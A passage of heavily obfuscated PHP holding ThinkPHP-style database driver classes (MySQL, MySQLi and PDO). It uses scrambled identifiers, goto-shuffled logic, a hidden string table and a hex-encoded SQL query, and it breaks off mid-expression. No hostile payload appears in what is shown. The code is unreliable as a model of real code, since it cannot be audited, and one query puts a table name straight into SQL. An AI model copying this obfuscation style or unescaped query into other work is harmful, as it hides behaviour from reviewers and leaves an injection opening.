as $Dâœ∆ÇÕÖ⁄ => $AÎâÈßÃ∏®) { $b¡πûàóÈ–[$AÎâÈßÃ∏®[$C¶¡Ãã»Çƒ[27]]] = array($C¶¡Ãã»Çƒ[28] => $AÎâÈßÃ∏®[$C¶¡Ãã»Çƒ[27]], $C¶¡Ãã»Çƒ[29] => $AÎâÈßÃ∏®[$C¶¡Ãã»Çƒ[30]], $C¶¡Ãã»Çƒ[31] => (bool) (strtoupper($AÎâÈßÃ∏®[$C¶¡Ãã»Çƒ[32]]) === $C¶¡Ãã»Çƒ[869]), $C¶¡Ãã»Çƒ[34] => $AÎâÈßÃ∏®[$C¶¡Ãã»Çƒ[35]], $C¶¡Ãã»Çƒ[36] => strtolower($AÎâÈßÃ∏®[$C¶¡Ãã»Çƒ[37]]) == $C¶¡Ãã»Çƒ[38], $C¶¡Ãã»Çƒ[39] => strtolower($AÎâÈßÃ∏®[$C¶¡Ãã»Çƒ[40]]) == $C¶¡Ãã»Çƒ[41]); } } return $b¡πûàóÈ–; } public function getTables($BÉœçÑ«¥∆ = '') { $Aﬁ¡í∆≤Àå =& $_SERVER[Öíæ€“”≠éÏË]; if (!empty($BÉœçÑ«¥∆)) { $aÂ™êºéÕÎ = $Aﬁ¡í∆≤Àå[870] . $BÉœçÑ«¥∆ . $Aﬁ¡í∆≤Àå[871]; } else { $aÂ™êºéÕÎ = $Aﬁ¡í∆≤Àå[872]; } $B¢ÖèÖÓúÆ = $this->query($aÂ™êºéÕÎ); $C◊Ÿ¶ñÿ°„ = array(); foreach ($B¢ÖèÖÓúÆ as $eúòòìëÎá => $déÓâÜÆ·Â) { $C◊Ÿ¶ñÿ°„[$eúòòìëÎá] = current($déÓâÜÆ·Â); } return $C◊Ÿ¶ñÿ°„; } public function replace($Dµ◊«≥ËÃâ, $aˆ†ŸÂ›ƒ— = array()) { $CÆñ“£Íæê =& $_SERVER[Öíæ€“”≠éÏË]; foreach ($Dµ◊«≥ËÃâ as $AûëÉ™£∂© => $C¬Á ◊ÒâÉ) { $A›¥Ñïã⁄À = $this->parseValue($C¬Á ◊ÒâÉ); if (is_scalar($A›¥Ñïã⁄À)) { $CÛ ÕÏ®Ñª[] = $A›¥Ñïã⁄À; $DÇ≈àíƒ∂ç[] = $this->parseKey($AûëÉ™£∂©); } } $F±‹ä£ÆÓ¡ = $CÆñ“£Íæê[873] . $this->parseTable($aˆ†ŸÂ›ƒ—[$CÆñ“£Íæê[277]]) . $CÆñ“£Íæê[874] . implode($CÆñ“£Íæê[47], $DÇ≈àíƒ∂ç) . $CÆñ“£Íæê[875] . implode($CÆñ“£Íæê[47], $CÛ ÕÏ®Ñª) . $CÆñ“£Íæê[876]; return $this->execute($F±‹ä£ÆÓ¡); } public function insertAll($Bπ√Ω« Ñ«, $D•≠ Û∫Ó¥ = array(), $EäÌ°©¶ëõ = false) { goto E•‹Û‘Áæå; E•‹Û‘Áæå: $AïØœπ»í≥ =& $_SERVER[Öíæ€“”≠éÏË]; if (!is_array($Bπ√Ω« Ñ«[0])) { return !1; } $Dãæõ€ä¿› = array_keys($Bπ√Ω« Ñ«[0]); goto EÚº√äè°á; EÚº√äè°á: $EáÉ£á‘Ææ = array(); foreach ($Bπ√Ω« Ñ« as $Dá…í⁄ÂŒÆ) { $e≤•ÛµäÏ« = array(); foreach ($Dá…í⁄ÂŒÆ as $Aõ»áıè¥Ã => $eè©îàí⁄…) { $eè©îàí⁄… = $this->parseValue($eè©îàí⁄…); if (is_scalar($eè©îàí⁄…)) { $e≤•ÛµäÏ«[] = $eè©îàí⁄…; } } $EáÉ£á‘Ææ[] = $AïØœπ»í≥[258] . implode($AïØœπ»í≥[47], $e≤•ÛµäÏ«) . $AïØœπ»í≥[876]; } array_walk($Dãæõ€ä¿›, array($this, $AïØœπ»í≥[877])); goto dÌõÌåâ¢È; dÌõÌåâ¢È: $c≤®≈µâÇü = ($EäÌ°©¶ëõ ? $AïØœπ»í≥[878] : $AïØœπ»í≥[879]) . $AïØœπ»í≥[880] . $this->parseTable($D•≠ Û∫Ó¥[$AïØœπ»í≥[277]]) . $AïØœπ»í≥[874] . implode($AïØœπ»í≥[47], $Dãæõ€ä¿›) . $AïØœπ»í≥[881] . implode($AïØœπ»í≥[47], $EáÉ£á‘Ææ); return $this->execute($c≤®≈µâÇü); goto Fêá”Ç∂ö; Fêá”Ç∂ö: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $fÒ⁄ëóÖ˜ù =& $_SERVER[Öíæ€“”≠éÏË]; $this->error = mysql_errno() . $fÒ⁄ëóÖ˜ù[4] . mysql_error($this->_linkID); if ($fÒ⁄ëóÖ˜ù[33] != $this->queryStr) { $this->error .= LNG($fÒ⁄ëóÖ˜ù[45]) . $this->queryStr; } think_trace($this->error, $fÒ⁄ëóÖ˜ù[33], $fÒ⁄ëóÖ˜ù[46]); return $this->error; } public function escapeString($e€∂∂Éû¨∏) { if ($this->_linkID) { return mysql_real_escape_string($e€∂∂Éû¨∏, $this->_linkID); } else { return mysql_escape_string($e€∂∂Éû¨∏); } } public function parseKey(&$E◊Ã÷ç€ï‘, $b±Ûß±‚ÁÁ = true) { $F±©¬±ë®∏ =& $_SERVER[Öíæ€“”≠éÏË]; if ($b±Ûß±‚ÁÁ) { $E◊Ã÷ç€ï‘ = $this->parseKeyCheck($E◊Ã÷ç€ï‘); } if ($E◊Ã÷ç€ï‘ != $F±©¬±ë®∏[182] && !preg_match($F±©¬±ë®∏[882], $E◊Ã÷ç€ï‘)) { $E◊Ã÷ç€ï‘ = $F±©¬±ë®∏[382] . trim($E◊Ã÷ç€ï‘, $F±©¬±ë®∏[382]) . $F±©¬±ë®∏[382]; } return $E◊Ã÷ç€ï‘; } } class DbMysqli extends Db { public function __construct($f∞œﬁ∆Ñ§« = '') { $fÒÒƒﬂ„≈Í =& $_SERVER[Öíæ€“”≠éÏË]; if (!extension_loaded($fÒÒƒﬂ„≈Í[771])) { think_exception(think_lang($fÒÒƒﬂ„≈Í[10]) . $fÒÒƒﬂ„≈Í[883]); } if (!empty($f∞œﬁ∆Ñ§«)) { $this->config = $f∞œﬁ∆Ñ§«; if (empty($this->config[$fÒÒƒﬂ„≈Í[13]])) { $this->config[$fÒÒƒﬂ„≈Í[13]] = $fÒÒƒﬂ„≈Í[33]; } } } public function connect($e¿◊Ωèäª— = '', $cÕåÙÒ≈úº = 0) { $Dô†∑®ÒﬁÒ =& $_SERVER[Öíæ€“”≠éÏË]; if (!isset($this->linkID[$cÕåÙÒ≈úº])) { goto e¡Û•µé∫≠; EΩìü™èäÃ: $CÖË∂≥´ÊÚ = $this->linkID[$cÕåÙÒ≈úº]->server_version; $this->linkID[$cÕåÙÒ≈úº]->query($Dô†∑®ÒﬁÒ[861] . think_config($Dô†∑®ÒﬁÒ[862]) . $Dô†∑®ÒﬁÒ[55]); if ($CÖË∂≥´ÊÚ > $Dô†∑®ÒﬁÒ[863]) { $this->linkID[$cÕåÙÒ≈úº]->query($Dô†∑®ÒﬁÒ[864]); } goto a”¢§É·†Ω; e¡Û•µé∫≠: if (empty($e¿◊Ωèäª—)) { $e¿◊Ωèäª— = $this->config; } $this->linkID[$cÕåÙÒ≈úº] = new mysqli($e¿◊Ωèäª—[$Dô†∑®ÒﬁÒ[857]], $e¿◊Ωèäª—[$Dô†∑®ÒﬁÒ[859]], $e¿◊Ωèäª—[$Dô†∑®ÒﬁÒ[860]], $e¿◊Ωèäª—[$Dô†∑®ÒﬁÒ[17]], $e¿◊Ωèäª—[$Dô†∑®ÒﬁÒ[858]] ? intval($e¿◊Ωèäª—[$Dô†∑®ÒﬁÒ[858]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto EΩìü™èäÃ; a”¢§É·†Ω: $this->connected = !0; if (1 != think_config($Dô†∑®ÒﬁÒ[18])) { unset($this->config); } goto Câ¥ÉèÒ¡»; Câ¥ÉèÒ¡»: } return $this->linkID[$cÕåÙÒ≈úº]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Dá¶≥”áµØ) { goto e∆»™Ï◊˘ ; e∆»™Ï◊˘ : $E¥√’≠ñà¶ =& $_SERVER[Öíæ€“”≠éÏË]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto e«®ÉÉÖÚ°; dÌ∑øÉË√À: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto d«ï◊†¿À¡; e«®ÉÉÖÚ°: $this->queryStr = $Dá¶≥”áµØ; if ($this->queryID) { $this->free(); } think_action_status($E¥√’≠ñà¶[19], 1); goto fú°à¥ì•∞; fú°à¥ì•∞: think_status($E¥√’≠ñà¶[20]); $this->queryID = $this->_linkID->query($Dá¶≥”áµØ); if ($this->_linkID->more_results()) { while (($aà∂ªá‰´ÿ = $this->_linkID->next_result()) != NULL) { $aà∂ªá‰´ÿ->free_result(); } } goto dÌ∑øÉË√À; d«ï◊†¿À¡: } public function execute($eÙ©‰„áÁ™) { goto a˜Üé±æùà; e‚ˆ¯ÁîÇ¿: if (!1 === $CÀª‡Í–∞∫) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto AÑï¥⁄ÌùÇ; bò•¯Ôß¡‰: $this->queryStr = $eÙ©‰„áÁ™; if ($this->queryID) { $this->free(); } think_action_status($CÂ≠Üë¬ﬂ◊[21], 1); goto EñÇ„ ˜•Æ; EñÇ„ ˜•Æ: think_status($CÂ≠Üë¬ﬂ◊[20]); $CÀª‡Í–∞∫ = $this->_linkID->query($eÙ©‰„áÁ™); $this->debug(); goto e‚ˆ¯ÁîÇ¿; a˜Üé±æùà: $CÂ≠Üë¬ﬂ◊ =& $_SERVER[Öíæ€“”≠éÏË]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bò•¯Ôß¡‰; AÑï¥⁄ÌùÇ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bπáÜπÚÕÙ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$bπáÜπÚÕÙ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $DÂƒ¿äÒË  = $this->_linkID->rollback(); $this->transTimes = 0; if (!$DÂƒ¿äÒË ) { $this->error(); return !1; } } return !0; } private function getAll() { $DÔÙøè«’ó = array(); if ($this->numRows > 0) { for ($a‹áÔÀè˜‚ = 0; $a‹áÔÀè˜‚ < $this->numRows; $a‹áÔÀè˜‚++) { $DÔÙøè«’ó[$a‹áÔÀè˜‚] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $DÔÙøè«’ó; } public function getFields($C˘ö∏ë¬∏©) { $Dµ≤ˆƒªÔ« =& $_SERVER[Öíæ€“”≠éÏË]; $d’µá’”ç· = $this->query($Dµ≤ˆƒªÔ«[868] . $this->parseKey($C˘ö∏ë¬∏©)); $aÎÕô≈∂Ï∏ = array(); if ($d’µá’”ç·) { foreach ($d’µá’”ç· as $Aÿ‚≤ﬁ™É∂ => $aòíÎíŸéı) { $aÎÕô≈∂Ï∏[$aòíÎíŸéı[$Dµ≤ˆƒªÔ«[27]]] = array($Dµ≤ˆƒªÔ«[28] => $aòíÎíŸéı[$Dµ≤ˆƒªÔ«[27]], $Dµ≤ˆƒªÔ«[29] => $aòíÎíŸéı[$Dµ≤ˆƒªÔ«[30]], $Dµ≤ˆƒªÔ«[31] => (bool) ($aòíÎíŸéı[$Dµ≤ˆƒªÔ«[32]] === $Dµ≤ˆƒªÔ«[33]), $Dµ≤ˆƒªÔ«[34] => $aòíÎíŸéı[$Dµ≤ˆƒªÔ«[35]], $Dµ≤ˆƒªÔ«[36] => strtolower($aòíÎíŸéı[$Dµ≤ˆƒªÔ«[37]]) == $Dµ≤ˆƒªÔ«[38], $Dµ≤ˆƒªÔ«[39] => strtolower($aòíÎíŸéı[$Dµ≤ˆƒªÔ«[40]]) == $Dµ≤ˆƒªÔ«[41]); } } return $aÎÕô≈∂Ï∏; } public function getTables($b∆ãòáﬂÌﬂ = '') { $BãÑ≥í‘Ü” =& $_SERVER[Öíæ€“”≠éÏË]; $b’ï∆“Ù∂≤ = !empty($b∆ãòáﬂÌﬂ) ? $BãÑ≥í‘Ü”[870] . $b∆ãòáﬂÌﬂ . $BãÑ≥í‘Ü”[871] : $BãÑ≥í‘Ü”[872]; $Dü÷ÀÑùùÖ = $this->query($b’ï∆“Ù∂≤); $eã¨Ë·±∏¬ = array(); if ($Dü÷ÀÑùùÖ) { foreach ($Dü÷ÀÑùùÖ as $B˜ÕÏÑ≠€¯ => $b—«Ê•ú®è) { $eã¨Ë·±∏¬[$B˜ÕÏÑ≠€¯] = current($b—«Ê•ú®è); } } return $eã¨Ë·±∏¬; } public function replace($c´‘ùææ€≠, $FÛª∏ûó∑≤ = array()) { $A˜™Àƒò“ã =& $_SERVER[Öíæ€“”≠éÏË]; foreach ($c´‘ùææ€≠ as $Fæô∫ìç¬æ => $d¿–‘âÇíÛ) { $eÜı ∆∑ç≥ = $this->parseValue($d¿–‘âÇíÛ); if (is_scalar($eÜı ∆∑ç≥)) { $eÊ«¬±µê[] = $eÜı ∆∑ç≥; $bÙ∑¨¯…µ•[] = $this->parseKey($Fæô∫ìç¬æ); } } $DÔá¶ÿÃÒç = $A˜™Àƒò“ã[873] . $this->parseTable($FÛª∏ûó∑≤[$A˜™Àƒò“ã[277]]) . $A˜™Àƒò“ã[874] . implode($A˜™Àƒò“ã[47], $bÙ∑¨¯…µ•) . $A˜™Àƒò“ã[875] . implode($A˜™Àƒò“ã[47], $eÊ«¬±µê) . $A˜™Àƒò“ã[876]; return $this->execute($DÔá¶ÿÃÒç); } public function insertAll($f©∏À≥∏‰√, $BØÔÕ„ØÌ´ = array(), $Fª†è◊ãª¬ = false) { goto EùãØ‰ôëæ; C√ñ„∂ˆÕŒ: $DØ‡—€‚¬ˆ = $Fª†è◊ãª¬ ? $fƒµÊˆû€÷[878] : $fƒµÊˆû€÷[879]; $Cåãóº˜ÙÀ = $DØ‡—€‚¬ˆ . $fƒµÊˆû€÷[880] . $this->parseTable($BØÔÕ„ØÌ´[$fƒµÊˆû€÷[277]]) . $fƒµÊˆû€÷[874] . implode($fƒµÊˆû€÷[47], $aÀõŒ“ÇË’) . $fƒµÊˆû€÷[881] . implode($fƒµÊˆû€÷[47], $e÷ÿ≠ÔÔ∫Ò); return $this->execute($Cåãóº˜ÙÀ); goto dõø·Ø•ü‘; eƒÓª¬π›â: $e÷ÿ≠ÔÔ∫Ò = array(); foreach ($f©∏À≥∏‰√ as $c‘ËÌ¶êôÍ) { $a‰ê‡€üÏá = array(); foreach ($c‘ËÌ¶êôÍ as $F·ù∆∂åô“ => $Dèß¶°âÁÏ) { $Dèß¶°âÁÏ = $this->parseValue($Dèß¶°âÁÏ); if (is_scalar($Dèß¶°âÁÏ)) { $a‰ê‡€üÏá[] = $Dèß¶°âÁÏ; } } $e÷ÿ≠ÔÔ∫Ò[] = $fƒµÊˆû€÷[258] . implode($fƒµÊˆû€÷[47], $a‰ê‡€üÏá) . $fƒµÊˆû€÷[876]; } array_walk($aÀõŒ“ÇË’, array($this, $fƒµÊˆû€÷[877])); goto C√ñ„∂ˆÕŒ; EùãØ‰ôëæ: $fƒµÊˆû€÷ =& $_SERVER[Öíæ€“”≠éÏË]; if (!is_array($f©∏À≥∏‰√[0])) { return !1; } $aÀõŒ“ÇË’ = array_keys($f©∏À≥∏‰√[0]); goto eƒÓª¬π›â; dõø·Ø•ü‘: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $E‚≥é©®äÚ =& $_SERVER[Öíæ€“”≠éÏË]; $this->error = $this->_linkID->errno . $E‚≥é©®äÚ[4] . $this->_linkID->error; if ($E‚≥é©®äÚ[33] != $this->queryStr) { $this->error .= LNG($E‚≥é©®äÚ[45]) . $this->queryStr; } think_trace($this->error, $E‚≥é©®äÚ[33], $E‚≥é©®äÚ[46]); return $this->error; } public function escapeString($C°≠ÖΩ•„) { if ($this->_linkID) { return $this->_linkID->real_escape_string($C°≠ÖΩ•„); } else { return addslashes($C°≠ÖΩ•„); } } public function parseKey(&$dçßÉ¬≈∏œ, $Aö†åÎÙΩ¢ = true) { $a≠úà™µÈ∏ =& $_SERVER[Öíæ€“”≠éÏË]; if ($Aö†åÎÙΩ¢) { $dçßÉ¬≈∏œ = $this->parseKeyCheck($dçßÉ¬≈∏œ); } if ($dçßÉ¬≈∏œ != $a≠úà™µÈ∏[182] && !preg_match($a≠úà™µÈ∏[882], $dçßÉ¬≈∏œ)) { $dçßÉ¬≈∏œ = $a≠úà™µÈ∏[382] . trim($dçßÉ¬≈∏œ, $a≠úà™µÈ∏[382]) . $a≠úà™µÈ∏[382]; } return $dçßÉ¬≈∏œ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Aà§¿ÂËÂñ = '') { $cûõ®çóöÖ =& $_SERVER[Öíæ€“”≠éÏË]; if (!class_exists($cûõ®çóöÖ[884])) { think_exception(think_lang($cûõ®çóöÖ[10]) . $cûõ®çóöÖ[885]); } if (!empty($Aà§¿ÂËÂñ)) { $this->config = $Aà§¿ÂËÂñ; if (empty($this->config[$cûõ®çóöÖ[13]])) { $this->config[$cûõ®çóöÖ[13]] = array(); } } } public function connect($eÁ§¿âÕ”˘ = '', $fÜá¬ìñ„ = 0) { $dÙ±ˆ¢—∂Ï =& $_SERVER[Öíæ€“”≠éÏË]; if (!isset($this->linkID[$fÜá¬ìñ„])) { goto CòÛ®†°Ø⁄; D°ã“”üºÁ: if (!$this->linkID[$fÜá¬ìñ„]) { think_exception($dÙ±ˆ¢—∂Ï[894]); } try { $this->linkID[$fÜá¬ìñ„]->exec($dÙ±ˆ¢—∂Ï[895] . think_config($dÙ±ˆ¢—∂Ï[862])); } catch (Exception $BÑíõÜ¿≠Ø) { } $this->connected = !0; goto A——„⁄“Ç’; Eµ„Íµ¨˘: try { $this->linkID[$fÜá¬ìñ„] = new PDO($eÁ§¿âÕ”˘[$dÙ±ˆ¢—∂Ï[886]], $eÁ§¿âÕ”˘[$dÙ±ˆ¢—∂Ï[859]], $eÁ§¿âÕ”˘[$dÙ±ˆ¢—∂Ï[860]], $eÁ§¿âÕ”˘[$dÙ±ˆ¢—∂Ï[13]]); } catch (PDOException $BÑíõÜ¿≠Ø) { think_exception($BÑíõÜ¿≠Ø->getMessage()); } $this->dbType = $this->_getDsnType($eÁ§¿âÕ”˘[$dÙ±ˆ¢—∂Ï[886]]); if (in_array($this->dbType, array($dÙ±ˆ¢—∂Ï[887], $dÙ±ˆ¢—∂Ï[888], $dÙ±ˆ¢—∂Ï[889], $dÙ±ˆ¢—∂Ï[890]))) { think_exception($dÙ±ˆ¢—∂Ï[891] . $this->dbType . $dÙ±ˆ¢—∂Ï[892] . $this->dbType . $dÙ±ˆ¢—∂Ï[893]); } goto D°ã“”üºÁ; CòÛ®†°Ø⁄: if (empty($eÁ§¿âÕ”˘)) { $eÁ§¿âÕ”˘ = $this->config; } $AŒºÕÖÈóó = !empty($eÁ§¿âÕ”˘[$dÙ±ˆ¢—∂Ï[13]][$dÙ±ˆ¢—∂Ï[14]]) ? $eÁ§¿âÕ”˘[$dÙ±ˆ¢—∂Ï[13]][$dÙ±ˆ¢—∂Ï[14]] : $this->pconnect; if ($AŒºÕÖÈóó) { $eÁ§¿âÕ”˘[$dÙ±ˆ¢—∂Ï[13]][PDO::ATTR_PERSISTENT] = !0; } goto Eµ„Íµ¨˘; A——„⁄“Ç’: if (1 != think_config($dÙ±ˆ¢—∂Ï[18])) { unset($this->config); } goto bÚπÁíãóÍ; bÚπÁíãóÍ: } return $this->linkID[$fÜá¬ìñ„]; } public function free() { $this->PDOStatement = null; } public function query($D†™íÒÀÂµ, $Aöå√Â‡æü = array()) { goto eâÓäÜçˆç; a¯ËÎ˜æú¬: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $BÂ‰èõÓàØ = $this->PDOStatement->execute($Aöå√Â‡æü); $this->debug(); goto Eòüî‡∞ì˘; Bº≥€‡À«Ú: think_action_status($cµÂ‡Ù©»¿[19], 1); think_status($cµÂ‡Ù©»¿[20]); $this->PDOStatement = $this->_linkID->prepare($D†™íÒÀÂµ); goto a¯ËÎ˜æú¬; d˘îÊ©£‹ä: $this->queryStr = $D†™íÒÀÂµ; if (!empty($Aöå√Â‡æü)) { $this->queryStr .= $cµÂ‡Ù©»¿[896] . print_r($Aöå√Â‡æü, !0) . $cµÂ‡Ù©»¿[897]; } if (!empty($this->PDOStatement)) { $this->free(); } goto Bº≥€‡À«Ú; eâÓäÜçˆç: $cµÂ‡Ù©»¿ =& $_SERVER[Öíæ€“”≠éÏË]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d˘îÊ©£‹ä; Eòüî‡∞ì˘: if (!1 === $BÂ‰èõÓàØ) { $this->error(); return !1; } else { return $this->getAll(); } goto BÒ¯ã·†à¶; BÒ¯ã·†à¶: } public function execute($AÁ≈Õöê‰†, $FõÂò·íæÏ = array()) { goto A˜ıÕàçãó; A˜ıÕàçãó: $BÃÊé‹£éô =& $_SERVER[Öíæ€“”≠éÏË]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Dë√ı—ÿÓ≈; Dë√ı—ÿÓ≈: $this->queryStr = $AÁ≈Õöê‰†; if (!empty($FõÂò·íæÏ)) { $this->queryStr .= $BÃÊé‹£éô[896] . print_r($FõÂò·íæÏ, !0) . $BÃÊé‹£éô[897]; } $cú∂ÃÎÇƒ‹ = !1; goto Fö©óæÿËë; EÚ≥’¿•®Ù: think_status($BÃÊé‹£éô[20]); $this->PDOStatement = $this->_linkID->prepare($AÁ≈Õöê‰†); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto A†ïƒ´óèÑ; A†ïƒ´óèÑ: $dß∏ßöÜ‡˘ = $this->PDOStatement->execute($FõÂò·íæÏ); $this->debug(); if (!1 === $dß∏ßöÜ‡˘) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($cú∂ÃÎÇƒ‹ || preg_match($BÃÊé‹£éô[902], $AÁ≈Õöê‰†)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto C¯±©´õÆø; Fö©óæÿËë: if ($this->dbType == $BÃÊé‹£éô[890]) { if (preg_match($BÃÊé‹£éô[898], $this->queryStr, $CœüÀÉïàÒ)) { $this->table = think_config($BÃÊé‹£éô[899]) . str_ireplace(think_config($BÃÊé‹£éô[900]), $BÃÊé‹£éô[375], $CœüÀÉïàÒ[2]); $cú∂ÃÎÇƒ‹ = (bool) $this->query($BÃÊé‹£éô[901] . strtoupper($this->table) . $BÃÊé‹£éô[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($BÃÊé‹£éô[21], 1); goto EÚ≥’¿•®Ù; C¯±©´õÆø: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AËËı©≈â® = $this->_linkID->commit(); $this->transTimes = 0; if (!$AËËı©≈â®) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $C‚Ã†ä∫ØÑ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$C‚Ã†ä∫ØÑ) { $this->error(); return !1; } } return !0; } private function getAll() { $c∑°€êÔÜç = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($c∑°€êÔÜç); return $c∑°€êÔÜç; } public function getFields($fıçÿ≈óèç) { goto CëÒÔÈœáâ; CëÒÔÈœáâ: $DΩÊïÆõﬁç =& $_SERVER[Öíæ€“”≠éÏË]; $this->initConnect(!0); if (think_config($DΩÊïÆõﬁç[903])) { $DÇ√§€®§Ú = str_replace($DΩÊïÆõﬁç[904], $fıçÿ≈óèç, think_config($DΩÊïÆõﬁç[903])); } else { switch ($this->dbType) { case $DΩÊïÆõﬁç[887]: case $DΩÊïÆõﬁç[905]: $DÇ√§€®§Ú = "\x53\x45\114\x45\x43\x54\x20\40\40\143\157\x6c\165\x6d\156\137\156\x61\x6d\145\40\141\163\40\x27\x4e\x61\155\145\x27\54\x20\x20\40\144\x61\164\141\x5f\x74\171\160\x65\x20\x61\163\x20\47\x54\x79\x70\145\x27\54\40\x20\40\x63\157\154\165\x6d\156\137\144\145\x66\141\165\x6c\164\x20\141\163\x20\47\x44\145\146\x61\x75\154\164\47\54\x20\40\x20\151\163\x5f\x6e\165\x6c\154\141\142\x6c\145\40\141\163\x20\x27\116\x75\x6c\154\47\xa\11\x9\x46\122\x4f\115\11\151\156\146\x6f\162\155\141\164\x69\x6f\156\137\x73\x63\x68\x65\x6d\141\56\164\x61\x62\154\145\163\x20\x41\x53\40\x74\xa\11\x9\x4a\117\x49\116\11\151\x6e\x66\x6f\x72\x6d\x61\164\x69\157\156\x5f\163\143\150\x65\x6d\141\x2e\x63\x6f\x6c\165\155\x6e\163\40\x41\123\40\143\xa\x9\11\117\x4e\40\x20\x74\x2e\164\x61\x62\154\145\137\x63\141\164\141\154\x6f\x67\40\75\x20\143\x2e\x74\x61\142\x6c\x65\x5f\143\x61\164\141\154\x6f\147\12\x9\x9\101\116\x44\x20\x74\56\x74\x61\142\x6c\145\x5f\163\143\x68\145\155\141\40\x3d\x20\x63\x2e\x74\141\142\154\x65\137\163\143\x68\x65\155\x61\xa\x9\x9\x41\116\104\40\164\56\164\141\x62\x6c\145\137\x6e\141\155\x65\40\x3d\40\143\x2e\x74\x61\x62\x6c\x65\x5f\x6e\x61\155\145\xa\11\11\x57\110\x45\x52\105\40\40\x20\164\56\x74\141\142\x6c\x65\137\x6e\x61\x6d\145\40\75\x20\47{$fıçÿ≈óèç}\x27"; break; case $DΩÊïÆõﬁç[906]: $DÇ√§€®§Ú = $DΩÊïÆõﬁç[907] . $fıçÿ≈óèç . $DΩÊïÆõﬁç[908]; break; case $DΩÊïÆõﬁç[888]: case $DΩÊïÆõﬁç[890]: $DÇ√§€®§Ú = $DΩÊïÆõﬁç[909] . $DΩÊïÆõﬁç[910] . $DΩÊïÆõﬁç[911] . strtoupper($fıçÿ≈óèç) . $DΩÊïÆõﬁç[912] . strtoupper($fıçÿ≈óèç) . $DΩÊïÆõﬁç[913]; break; case $DΩÊïÆõﬁç[914]: $DÇ√§€®§Ú = $DΩÊïÆõﬁç[915] . $fıçÿ≈óèç . $DΩÊïÆõﬁç[916]; break; case $DΩÊïÆõﬁç[889]: break; case $DΩÊïÆõﬁç[917]: default: $DÇ√§€®§Ú = $DΩÊïÆõﬁç[918] . ($this->dbType == $DΩÊïÆõﬁç[917] ? "\x60{$fıçÿ≈óèç}\x60" : $fıçÿ≈óèç); } } goto bûâ€Òı¶ﬂ; døô‰Ú≠Â‡: return $Aòª÷Í≥◊; goto FÓ”çâÀó≈; bûâ€Òı¶ﬂ: $D√Ïﬁ€–ê› = $this->query($DÇ√§€®§Ú); $Aòª÷Í≥◊ = array(); if ($D√Ïﬁ€–ê›) { foreach ($D√Ïﬁ€–ê› as $cñ≠èïÑó¶ => $fﬂéÀê»‘Ÿ) { $fﬂéÀê»‘Ÿ = array_change_key_case($fﬂéÀê»‘Ÿ); $fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[28]] = isset($fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[28]]) ? $fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[28]] : $DΩÊïÆõﬁç[375]; $fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[29]] = isset($fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[29]]) ? $fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[29]] : $DΩÊïÆõﬁç[375]; $eÒìÒöÎÁ– = isset($fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[271]]) ? $fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[271]] : $fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[28]]; $Aòª÷Í≥◊[$eÒìÒöÎÁ–] = array($DΩÊïÆõﬁç[28] => $eÒìÒöÎÁ–, $DΩÊïÆõﬁç[29] => $fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[29]], $DΩÊïÆõﬁç[31] => (bool) (isset($fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[103]]) && $fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[103]] === $DΩÊïÆõﬁç[33] || isset($fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[31]]) && $fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[31]] === $DΩÊïÆõﬁç[33]), $DΩÊïÆõﬁç[34] => isset($fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[34]]) ? $fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[34]] : (isset($fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[53]]) ? $fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[53]] : $DΩÊïÆõﬁç[375]), $DΩÊïÆõﬁç[36] => isset($fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[93]]) ? strtolower($fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[93]]) == $DΩÊïÆõﬁç[38] : (isset($fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[54]]) ? 